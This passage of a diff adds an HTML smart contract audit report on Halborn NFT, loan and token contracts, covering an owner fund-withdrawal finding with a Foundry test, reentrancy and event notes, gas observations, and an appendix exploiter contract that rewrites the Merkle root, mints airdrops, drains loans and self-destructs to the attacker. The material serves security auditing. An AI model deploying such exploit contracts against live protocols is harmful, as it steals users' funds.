+<span class="hljs-addition">+       function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {</span>
+<span class="hljs-addition">+          return IERC721Receiver.onERC721Received.selector;</span>
+<span class="hljs-addition">+       }</span>
+
+</div></code></pre>
+</details>
+</li>
+</ul>
+<h3 id="halbornnftsol-owner-can-withdraw-all-the-ether-from-the-contract-removing-the-value-backing-other-functionalities"><code>HalbornNFT.sol</code> owner can withdraw all the ether from the contract, removing the value backing other functionalities.</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li><code>HalbornNFT::withdrawETH</code> function allows the owner to deliberately pull all the ether that is backing the other protocol functionalities, leading to trust-only potential rug-pulls</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Draining all the protocol ether and financially hurt users.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>Please implement the following changes</summary>
+<pre class="hljs"><code><div>    uint256 constant VALUE_TO_SIMULATE_NFT_SELLING = 1000 ether;
+    function testIfOwnerCanRugTheEthBackingTheNFTsAndToken() public {
+        vm.deal(address(nft), VALUE_TO_SIMULATE_NFT_SELLING);
+
+        vm.startPrank(Barba);
+        
+        assertEq(Barba.balance, 0);
+        nft.withdrawETH(address(nft).balance);
+        assertEq(Barba.balance, VALUE_TO_SIMULATE_NFT_SELLING);
+
+        vm.stopPrank();
+    }
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>If the protocol owner needs any income or value to cover costs, consider adding a fee over transations. Withdraw over arbitrary value is unsafe.</li>
+</ul>
+</li>
+</ul>
+<h2 id="low-severity-vulnerabilities">Low Severity Vulnerabilities</h2>
+<h3 id="reentrancy-risk-the-halbornloansdepositnftcollateral-doesnt-follow-cei-patterns">Reentrancy Risk. The <code>HalbornLoans::depositNFTCollateral</code> doesn't follow CEI patterns</h3>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li><code>HalbornLoans::depositNFTCollateral</code> doesn't follow the CEI pattern of updating storage variables after an external call.</li>
+</ul>
+</li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>Always follow security patterns such as CEI, layout, variables, and function naming patterns.</li>
+</ul>
+</li>
+</ul>
+<h3 id="reentrancy-risk-the-halbornloanswithdrawcollateral-doesnt-follow-cei-patterns">Reentrancy Risk. The <code>HalbornLoans::withdrawCollateral</code> doesn't follow CEI patterns</h3>
+<ul>
+<li><strong>Description:</strong>
+<ul>
+<li><code>HalbornLoans::depositNFTCollateral</code> doesn't follow the CEI pattern of updating storage variables after an external call.</li>
+</ul>
+</li>
+<li><strong>Recommendation:</strong>
+<ul>
+<li>Always follow security patterns such as CEI, layout, variables, and function naming patterns.</li>
+</ul>
+</li>
+</ul>
+<h3 id="storage-variables-updated-without-event-emission">Storage variables updated without event emission</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+  <details>
+  <summary>Instances</summary>
+<pre class="hljs"><code><div>  //HalbornLoans.sol
+  function depositNFTCollateral
+  function withdrawCollateral
+  function getLoan
+  function returnLoan
+</div></code></pre>
+<pre class="hljs"><code><div>  //HalbornNFT.sol
+  function setPrice
+  function setMerkleRoot
+  function withdrawETH
+</div></code></pre>
+<pre class="hljs"><code><div>  //HalbornToken.sol
+  function setLoans
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Consider adding verbose events to the functions above to facilitate keeping track of state changes.</li>
+</ul>
+</li>
+</ul>
+<h2 id="gas-observations">Gas Observations</h2>
+<h3 id="state-variables">State Variables</h3>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+  <details>
+  <summary>The following variables could be private to save some gas</summary>
+<pre class="hljs"><code><div>  //HalbornLoans.sol
+  HalbornToken public token;
+  HalbornNFT public nft;
+
+  uint256 public immutable collateralPrice;
+
+  mapping(address =&gt; uint256) public totalCollateral;
+  mapping(address =&gt; uint256) public usedCollateral;
+  mapping(uint256 =&gt; address) public idsCollateral;
+</div></code></pre>
+<pre class="hljs"><code><div>  //HalbornNFT.sol
+  bytes32 public merkleRoot;
+  uint256 public price;
+  uint256 public idCounter;
+</div></code></pre>
+<pre class="hljs"><code><div>  //HalbornNFT.sol
+  address public halbornLoans;
+</div></code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>The variables displayed above should be private. If external access is needed, consider creating getters.</li>
+</ul>
+</li>
+</ul>
+<h2 id="appendices">Appendices</h2>
+<h3 id="exploiter-contract-example">Exploiter Contract Example</h3>
+<display>
+<summary>Exploiter Contract - Please Include in the `Halborn.t.sol` file.</summary>
+<pre class="hljs"><code><div>
+interface IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
+}
+
+contract exploiter is IERC721Receiver {
+    HalbornNFT immutable nftExploited;
+    HalbornLoans immutable loansExploited;
+    Merkle immutable m;
+    address immutable Barba = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
+
+    constructor(address _nft, address _merkle, address _barba, address _loans){
+        nftExploited = HalbornNFT(_nft);
+        m = Merkle(_merkle);
+        Barba = _barba;
+        loansExploited = HalbornLoans(_loans);
+    }
+
+    bytes32[] public EXPLOITER_PROOF_1;
+    bytes32[] public EXPLOITER_PROOF_2;
+    bytes32[] public EXPLOITER_PROOF_3;
+    bytes32[] public EXPLOITER_PROOF_4;
+
+    // Get Merkle Root
+    bytes32 public root;
+
+    //manipulating merkle root, and draining funds
+    function exploit() public {
+        bytes32[] memory data = new bytes32[](4);
+        data[0] = keccak256(abi.encodePacked(address(this), uint256(10)));
+        data[1] = keccak256(abi.encodePacked(address(this), uint256(25)));
+        data[2] = keccak256(abi.encodePacked(address(this), uint256(39)));
+        data[3] = keccak256(abi.encodePacked(address(this), uint256(41)));
+
+        root = m.getRoot(data);
+        
+        nftExploited.setMerkleRoot(root);
+
+        EXPLOITER_PROOF_1 = m.getProof(data, 0); //to mint the nft
+        EXPLOITER_PROOF_2 = m.getProof(data, 1);
+        EXPLOITER_PROOF_3 = m.getProof(data, 2);
+        EXPLOITER_PROOF_4 = m.getProof(data, 3);
+        
+        nftExploited.mintAirdrops(10, EXPLOITER_PROOF_1);
+        nftExploited.mintAirdrops(25, EXPLOITER_PROOF_2);
+        nftExploited.mintAirdrops(39, EXPLOITER_PROOF_3);
+        nftExploited.mintAirdrops(41, EXPLOITER_PROOF_4);
+    }
+
+    function drainFundsWithFixedCollateralValue() public {
+        uint256 nftId = nftExploited.idCounter()+1;
+        
+        for(uint256 i = nftId; i &lt; 26; i++){
+            //1. Buy NFT
+            nftExploited.mintBuyWithETH{value: 1 ether}();
+            //2. gets the approval
+            nftExploited.approve(address(loansExploited), i);
+            //2. Allocate as collateral
+            loansExploited.depositNFTCollateral(i);
+            uint256 valueToLoan = (loansExploited.totalCollateral(address(this)) - loansExploited.usedCollateral(address(this)));
+            //3. Get a loan
+            loansExploited.getLoan(valueToLoan + 1);
+            //4. HalbornToken &gt; Swap &gt; Ether
+            //5. Start again
+        }
+
+    }
+
+    function triggerSelfDestruct() public {
+        selfdestruct(payable(Barba));
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+}
+
+</div></code></pre>
+</display>
+
+</body>
+</html>
